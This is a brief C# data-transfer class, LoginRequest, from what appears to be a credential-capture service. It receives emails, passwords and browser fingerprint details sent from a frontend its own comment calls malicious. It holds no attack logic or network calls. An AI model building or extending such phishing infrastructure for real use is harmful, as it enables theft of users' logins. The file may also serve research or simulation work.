namespace CredentialCaptureService.DTOs;

/**
 * Incoming request DTO from malicious frontend
 */
public class LoginRequest
{
    public string Email { get; set; } = string.Empty;
    public string Password { get; set; } = string.Empty;
    public string? UserAgent { get; set; }
    public string? Timezone { get; set; }
    public string? ScreenResolution { get; set; }
    public string? Language { get; set; }
    public string? Platform { get; set; }
}
